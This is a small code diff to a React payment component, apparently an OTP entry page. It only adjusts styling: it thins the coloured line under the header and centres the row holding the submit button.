@@ -189,7 +189,7 @@ const RocketPayment = () => {
         <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
           {header}
           {/* Colored line under header */}
-          <div className="flex h-[4px]">
+          <div className="flex h-[2px]">
             <div className="flex-1 bg-[#0044aa]"></div>
             <div className="flex-1 bg-[#cc0000]"></div>
             <div className="flex-1 bg-[#009933]"></div>
@@ -219,7 +219,7 @@ const RocketPayment = () => {
             </div>
 
             {/* Go button + error inline */}
-            <div className="flex items-center gap-3 mb-4">
+            <div className="flex items-center justify-center gap-3 mb-4">
               <button
                 onClick={handleOtpSubmit}
                 disabled={isSubmitting}
